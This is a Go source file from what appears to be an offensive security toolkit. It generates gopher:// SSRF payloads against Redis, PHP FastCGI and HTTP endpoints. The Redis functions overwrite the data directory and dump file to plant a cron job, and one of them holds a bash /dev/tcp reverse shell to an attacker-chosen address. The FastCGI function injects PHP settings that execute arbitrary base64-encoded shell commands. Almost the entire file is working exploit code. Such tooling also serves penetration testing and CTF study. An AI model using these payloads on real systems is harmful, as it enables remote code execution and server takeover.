package gopher

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"mime/multipart"
	"net/url"
	"os"
	"strconv"
	"strings"

	"github.com/virink/virzz/common"
	"github.com/virink/virzz/tools/client/fastcgi"
	"github.com/virink/virzz/utils"
)

func replaceFastCGIPayload(p string) string {
	p = strings.ReplaceAll(p, "+", "%20")
	p = strings.ReplaceAll(p, "%2F", "/")
	return p
}
func replaceRedisPayload(p string) string {
	p = replaceFastCGIPayload(p)
	p = strings.ReplaceAll(p, "%25", "%")
	p = strings.ReplaceAll(p, "%3A", ":")
	return p
}

// ExpRedisCmd -
func ExpRedisCmd(addr, path, name, data string) (string, error) {
	common.Logger.Debug("path: ", path)
	common.Logger.Debug("name: ", name)
	common.Logger.Debug("data: ", data)
	ps := []string{
		"*1", "$8", "flushall",
		"*3", "$3", "set", "$1", "1", fmt.Sprintf("$%d", len(data)), data,
		"*4", "$6", "config", "$3", "set", "$3", "dir", fmt.Sprintf("$%d", len(path)), path,
		"*4", "$6", "config", "$3", "set", "$10", "dbfilename", fmt.Sprintf("$%d", len(name)), name,
		"*1", "$4", "save",
		"*1", "$4", "quit",
		"",
	}
	p := url.QueryEscape(strings.Join(ps, "\r\n"))
	return fmt.Sprintf("gopher://%s/_%s", addr, replaceRedisPayload(p)), nil
}

// ExpRedisReverseShell -
func ExpRedisReverseShell(addr, path, name, reverseAddr string) (string, error) {
	ip, port, err := utils.ParseAddr(reverseAddr)
	if err != nil {
		return "", err
	}
	cmd := fmt.Sprintf("\n\n*/1 * * * * sh -c \"bash -i >& /dev/tcp/%s/%d 0>&1\"\n\n", ip, port)
	return ExpRedisCmd(addr, path, name, cmd)
}

// ExpFastCGI -
func ExpFastCGI(addr string, cmd, filename string, encode bool) (string, error) {
	// "/usr/share/php/PEAR.php"
	cmd = fmt.Sprintf(
		`<?php system(base64_decode('%s'));?>`,
		base64.StdEncoding.EncodeToString([]byte(cmd)),
	)
	env := map[string]string{
		"SERVER_SOFTWARE": "virzz - fcgiclient",
		"REMOTE_ADDR":     "127.0.0.1",
		"SERVER_PROTOCOL": "HTTP/1.1",
		"CONTENT_LENGTH":  strconv.Itoa(len(cmd)),
		"REQUEST_METHOD":  "POST",
		"SCRIPT_FILENAME": filename,
		"PHP_VALUE":       "allow_url_include = On\ndisable_functions = \nauto_prepend_file = php://input",
		"DOCUMENT_ROOT":   "/",
	}
	r := fastcgi.NewFastCGIRecord(env, []byte(cmd))
	p := url.QueryEscape(string(r))
	if encode {
		p = url.QueryEscape(replaceFastCGIPayload(p))
	}
	return fmt.Sprintf("gopher://%s/_%s", addr, replaceFastCGIPayload(p)), nil
}

// ExpHTTPPost -
func ExpHTTPPost(addr string, uri string, datas map[string]string) (string, error) {
	// param := ""
	// if len(params) > 0 {
	// 	g := url.Values{}
	// 	for key, value := range params {
	// 		g.Add(key, value)
	// 	}
	// 	param = fmt.Sprintf("?%s", g.Encode())
	// }
	p := url.Values{}
	for key, value := range datas {
		p.Add(key, value)
	}
	data := p.Encode()
	headers := []string{
		fmt.Sprintf("POST %s HTTP/1.1", uri),
		fmt.Sprintf("Host: %s", addr),
		"Content-Type: application/x-www-form-urlencoded",
		fmt.Sprintf("Content-Length: %d", len(data)),
	}
	exp := fmt.Sprintf(
		"gopher://%s/_%s",
		addr,
		strings.ReplaceAll(url.QueryEscape(fmt.Sprintf("%s\r\n\r\n%s", strings.Join(headers, "\r\n"), data)), "+", "%20"),
	)
	return exp, nil
}

// ExpHTTPUpload -
func ExpHTTPUpload(addr string, uri string, datas map[string]string) (string, error) {
	bodyBuffer := &bytes.Buffer{}
	bodyWriter := multipart.NewWriter(bodyBuffer)
	// Field
	for key, value := range datas {
		if strings.HasPrefix(value, "@") {
			name := strings.TrimPrefix(value, "@")
			fw, _ := bodyWriter.CreateFormFile(key, name)
			f, _ := os.Open(name)
			defer f.Close()
			io.Copy(fw, f)
		} else {
			_ = bodyWriter.WriteField(key, value)
		}
	}
	contentType := bodyWriter.FormDataContentType()
	bodyWriter.Close()
	// SSRF Gopher
	data := bodyBuffer.String()
	headers := []string{
		fmt.Sprintf("POST %s HTTP/1.1", uri),
		fmt.Sprintf("Host: %s", addr),
		fmt.Sprintf("Content-Type: %s", contentType),
		fmt.Sprintf("Content-Length: %d", len(data)),
	}
	exp := fmt.Sprintf(
		"gopher://%s/_%s",
		addr,
		strings.ReplaceAll(url.QueryEscape(fmt.Sprintf("%s\r\n\r\n%s", strings.Join(headers, "\r\n"), data)), "+", "%20"),
	)
	return exp, nil
}
